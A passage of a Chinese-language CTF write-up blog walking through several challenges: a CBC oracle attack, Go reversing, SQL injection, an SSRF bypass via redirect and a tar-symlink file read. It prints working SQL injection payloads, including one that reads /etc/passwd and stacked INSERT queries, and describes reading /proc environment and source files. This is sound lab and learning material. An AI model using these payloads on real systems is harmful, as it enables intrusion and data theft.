style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token operator" style="color:#393A34">^</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/local/lib/python3.12/site-packages/Crypto/Cipher/_mode_cbc.py&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> line </span><span class="token number" style="color:#36acaa">287</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _create_cbc_cipher</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;Incorrect IV length (it must be %d bytes long)&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ValueError</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> Incorrect IV length </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">it must be </span><span class="token number" style="color:#36acaa">16</span><span class="token plain"> </span><span class="token builtin">bytes</span><span class="token plain"> </span><span class="token builtin">long</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>所以这应该是AES128-CBC加密。至于格式，根据nc给的示例和一些fuzz，可以得知类似于<code>fmt.format(flag)</code>这样的形式，可以传<code>{0}</code>, <code>{}</code>, <code>{0:s}</code>进去，大括号需要双写，但不知为什么传不了<code>{0[0]}</code>（如果能传这个题会弱化很多）。同时根据flag密文的返回，我们判断flag本身长度不会超过32个字节，所以我们只需要处理flag位于第一个block和第二个block两种情况。</p>
<p>由于IV可控，前16个字节比较容易。我们首先得到<code>&#x27;\0&#x27; * 0x10</code>在ECB意义下的密文，然后因为CBC的第一块密文等于<code>f(IV ^ plain1)</code>，所以我们只需要在明文格式前面留0xf个<code>\0</code>，在IV中遍历最后一个字符，直到和第一轮结果相同，我们就爆出了第一个字符。因为已知第一个字符，我们也就可以用同样方法爆出第二个字符，直到前0x10个字符。</p>
<p>后半部分稍微难一点。因为后16个字符的IV不可控（即第一块密文）。但其实我们只要知道第一块密文和第二块密文（随机  加密一次就可做到），以及第二块明文的前n-1个字符，我们就可以把这个过程提到第一块来，这样我们又可以遍历IV的最后一个字符了。</p>
<p><a href="/assets/files/req-fbdaf69f623bb51872377c04b9650a06.py" target="_blank">exp</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="rev---go-go-gadget">rev - Go Go Gadget<a href="#rev---go-go-gadget" class="hash-link" aria-label="rev - Go Go Gadget的直接链接" title="rev - Go Go Gadget的直接链接">​</a></h2>
<p>第一次打Golang逆向（checksec可知）。不得不说这种时候还是得靠工具啊，找了一个Ghidra的<code>GolangAnalyzerExtension</code>插件，oneshot一下分析，至少可以快速看出我们要找的函数（evil.go中的main.main，其他都是库函数）。结合逆向的函数名通读逻辑，就是一个循环strxor，密钥是secret。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="pwn---the-gumponent">pwn - The Gumponent<a href="#pwn---the-gumponent" class="hash-link" aria-label="pwn - The Gumponent的直接链接" title="pwn - The Gumponent的直接链接">​</a></h2>
<p>没任何营养的栈溢出</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---warm-up-beep-boop">web - [Warm Up] Beep Boop<a href="#web---warm-up-beep-boop" class="hash-link" aria-label="web - [Warm Up] Beep Boop的直接链接" title="web - [Warm Up] Beep Boop的直接链接">​</a></h2>
<p>这个题有个特点，网页上任何东西都不是CTF网站的，而是iframe链到外面。因为这个题是warmup，所以不可能有太复杂的东西，就看了一眼robots.txt，好了，就在这里，有个Base64串</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---toon-town-fan-club">web - Toon Town Fan Club<a href="#web---toon-town-fan-club" class="hash-link" aria-label="web - Toon Town Fan Club的直接链接" title="web - Toon Town Fan Club的直接链接">​</a></h2>
<p>比较简单的SQL注入。但我本身就不太擅长SQLi所以可以说难度匹配正常。</p>
<p>首先很容易在搜索页面试出来<code>1&#x27; or 1=1 #1</code>是有效的（我发现<code>--</code>注释符号好像不好用，不知道和sql版本有没有关系）。然后很容易union试出来取的变量是三个。然后开始拿数据库名，表名，列名</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; databases</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> schema_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">schemata </span><span class="token comment" style="color:#999988;font-style:italic">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; tables</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> table_schema</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> table_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">tables</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_schema </span><span class="token operator" style="color:#393A34">!=</span><span class="token string" style="color:#e3116c">&#x27;information_schema&#x27;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; columns</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> GROUP_CONCAT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">FROM</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">WHERE</span><span class="token plain"> table_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;post&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">limit</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic"># </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; version (load_file not work)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> version</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> load_file</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;/etc/passwd&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> post </span><span class="token comment" style="color:#999988;font-style:italic">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>三个列名分别是name, slug和filename。name应该是ID，slug是URL endpoint（比如访问<code>/blog/:slug</code>）就可以访问  对应内容，而内容保存路径就是filename。如果能改filename我们可能可以实现任意文件读取。</p>
<p>然后需要提一下这个题是共享instance的，然后我做题的时候就发现有其他人一直往里面加奇奇怪怪的条目，但好像一会就会删掉。所以我认为这个题很可能能insert。但是select子句里是不能插入insert的。然而我们可以分号断成两句，就可以insert了。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27; my_name is random generated uuid to slow others from accessing</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">insert</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">into</span><span class="token plain"> post </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> slug</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> filename</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">values</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;kusanagi_nene&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;{my_name}&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;flag.txt&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">#</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token string" style="color:#e3116c">&#x27; dont forget to clear up evidence (but it seems deleting wont work somehow)</span><br></span><span class="token-line" style="color:#393A34"><span class="token string" style="color:#e3116c">&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">delete</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> post </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> name</span><span class="token operator" style="color:#393A34">=</span><span class="token string" style="color:#e3116c">&#x27;kusanagi_nene&#x27;</span><span class="token comment" style="color:#999988;font-style:italic">#</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>嗯，就这样。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---leaked-login">web - Leaked Login<a href="#web---leaked-login" class="hash-link" aria-label="web - Leaked Login的直接链接" title="web - Leaked Login的直接链接">​</a></h2>
<p>这题也比较奇怪。题目给了登录账号和密码，但是我们还需要一个两步验证OTP code。</p>
<p>一般两步验证是会向TOTP服务器发一个请求，然后TOTP根据结果会返回一个请求，包括验证是否通过，原本重定向的资源等等。但是这个题验证是否通过就看<code>flag.php</code>POST参数里是否有一个<code>goodness</code>参数，如果不通过这个参数是0。如果我手动改为1，那就通过了，就拿到flag了。</p>
<p>真实的TOTP不会这么简单的，一定是包含了加密和复杂逆向过程。但确实是有伪造的可能性。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="damctf-2024">DamCTF 2024<a href="#damctf-2024" class="hash-link" aria-label="DamCTF 2024的直接链接" title="DamCTF 2024的直接链接">​</a></h2>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web-flower">web-flower<a href="#web-flower" class="hash-link" aria-label="web-flower的直接链接" title="web-flower的直接链接">​</a></h2>
<p>源码给了很长，是一个flask服务，通外网。</p>
<p>敏感服务包括两个，一个是<code>/special_flower</code>，会判断<code>request.remote_addr</code>是否为四类本地IP，如果是则返回<code>flag.png</code>。因为正确配置了ProxyFix，所以不存在XFF绕过的可能性。（一般来说XFF是不能信任的，但如果服务器在NGINX等反代服务器后面，则可以信任最后一级，这似乎也是<code>werkzeug.ProxyFix</code>的默认参数）</p>
<p>另一个是<code>/filter_flower</code>，这个是一个通外网的搜索服务，首先会对URL做判断，用<code>urllib.parse</code>得到hostname，再用<code>dnspython</code>查询IP，如果为四类本地IP则直接abort，看起来过滤了SSRF。之后，会用requests进行请求，会调用一个混淆的密文，实际功能是判断URL path的后缀或者请求头是否为png图片，如果是则返回图片内容。</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">_ </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">proprietary_secret_ai_algorithm </span><span class="token operator" style="color:#393A34">:=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Cih2Oj1yYW5kb20uY2hvaWNlcyhbMTQyNSwyMzQsMTIsMHg3QiwtOTEyLDU2LDg3LDI5NCwweDIwLDM5NCwzOCwweDRELDgwMCwxMjMsMzU2LDB4N0QsMTI4NywxNzEyLDMyLDBdLGs9NCksdls6Oi0xXVtpbnQuZnJvbV9ieXRlcyhieXRlcyhmbG93ZXJbMTAwOjEwNF0pKSAlIDRdLy84ICsgdlszXSUyMCA8IDI2MCBhbmQgKHBhdGgubG93ZXIoKS5lbmRzd2l0aCgoJy5wbmcnLCcuanBnJywnLmpwZWcnLCcuYm1wJykpIG9yIGZsb3dlci5zdGFydHN3aXRoKGJ5dGVzKFsweDg5LCAweDUwLCAweDRFLCAweDQ3LCAweDBELCAweDBBLCAweDFBLCAweDBBXSkpKSlbMV0gCg==&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">proprietary_secret_ai_algorithm</span><span class="token operator" style="color:#393A34">:=</span><span class="token plain">base64</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">b64decode</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">proprietary_secret_ai_algorithm</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">is_flower </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token builtin">compile</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">proprietary_secret_ai_algorithm</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;&lt;0x1172947815&gt;&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;eval&quot;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># equals to </span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v</span><span class="token operator" style="color:#393A34">:=</span><span class="token plain">random</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">choices</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">1425</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">234</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">12</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x7B</span><span class="token punctuation" style="color:#393A34">,</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">912</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">56</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">87</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">294</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x20</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">394</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">38</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x4D</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">800</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">123</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">356</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0x7D</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1287</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1712</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">32</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> k</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    v</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">:</span><span class="token punctuation" style="color:#393A34">:</span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">[</span><span class="token builtin">int</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">from_bytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token builtin">bytes</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">flower</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">100</span><span class="token punctuation" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">104</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">4</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">//</span><span class="token number" style="color:#36acaa">8</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">]</span><span class="token operator" style="color:#393A34">%</span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">260</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">path</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">lower</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">endswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;.png&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;.jpg&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;.jpeg&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;.bmp&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">or</span><span class="token plain"> flower</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">startswith</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">b&#x27;\x89PNG\r\n\x1a\n&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>我一开始试了很久能不能通过病态的URL，使得dnspython解析不出本地IP，同时requests能访问本地图片，但试了很久做不到，主要是<code>dnspython</code>对IP地址和不存在的域名会报错，而不是返回一个默认值。</p>
<p>最后忽然想到，我直接用302跳转不就解决了？域名解析过程必然不会处理302，而requests访问内容时，我用302跳转直接跳到<code>localhost/special_flower</code>，因为requests默认会跟踪302，就能绕过SSRF了。（顺便requests不解析javascript，<code>location.href</code>是无效的）</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="web---tararchive">web - tararchive<a href="#web---tararchive" class="hash-link" aria-label="web - tararchive的直接链接" title="web - tararchive的直接链接">​</a></h2>
<p>蛮好玩的一道题。最后一步非预期地绕过了一个猜，感觉说不定可以RCE。不过没有那么去做</p>
<p>这个题首先需要登录。推测登录只是分离用户的手段（又是共享instance），本身和题目无关。登录后是一个文件管理界面，可以上传文件，看已上传文件列表，下载文件。devtools抓包会发现上传的是某种二进制格式，拿下来看格式会发现是<code>.tar.gz</code>，结合JS逆向，看来上传过程是在网页端JS把文件打包到gzip里然后上传的，我们当然可以绕过这个过程直接用API上传gzip。</p>
<p>既然是gzip打包解压过程，那首先要看的就是能不能打软链接进去。在<code>tar</code>中加<code>P</code>参数可以把软链接直接打进去，我们可以用这个方法拿到<code>/etc/passwd</code>，也就是说任意文件读取达成。</p>
<p>但其实接下来才是重头戏，因为我们不知道flag在哪，需要在服务器上取证。首先拿下来<code>/proc/self/cmdline</code>和<code>/proc/self/environ</code>，可以知道服务器是Python Sanic Server，并且是以ROOT身份运行的。不过值得注意的是，我们自己的进程是子进程，所以还要看一眼<code>status</code>，尝试拿一下</p>
<div class="language-sh codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-sh codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># child process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/bin/python </span><span class="token parameter variable" style="color:#36acaa">-c</span><span class="token plain"> from multiprocessing.spawn </span><span class="token function" style="color:#d73a49">import</span><span class="token plain"> spawn_main</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> spawn_main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">tracker_fd</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">6</span><span class="token plain">, </span><span class="token assign-left variable" style="color:#36acaa">pipe_handle</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">20</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  --multiprocessing-fork</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># parent process</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/local/bin/python /usr/local/bin/sanic server </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0.0</span><span class="token plain">.0.0</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后我们就发现问题了，源码呢？sanic显然是个包，我们还是不知道源码在哪。结合<code>sanic</code>文档，我们终于意识到源码应该和<code>sanic</code>里传的参数名一样是<code>server.py</code>，考虑到我们不知道绝对路径，那就<code>/proc/1/cwd/server.py</code>，确实拿到了源码。（1是父进程PID）。分析源码我们顺便把引用的几个本地模块<code>util.py</code>, <code>auth.py</code>一起拿下来。</p>
